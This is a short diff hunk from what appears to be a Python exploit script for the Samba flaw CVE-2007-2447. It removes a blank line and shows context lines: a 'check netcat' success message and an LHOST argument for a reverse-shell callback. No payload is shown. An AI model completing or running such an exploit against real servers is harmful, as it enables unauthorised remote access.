@@ -40,7 +40,6 @@ class CVE2007_2447:
         except:
             print (LogColors.GREEN + 'payload successfully send. check netcat :)' + LogColors.ENDC)
 
-    
 if __name__ == '__main__':
     parser = argparse.ArgumentParser()
     parser.add_argument('-lh','--lhost', required = True, help = "LHOST")
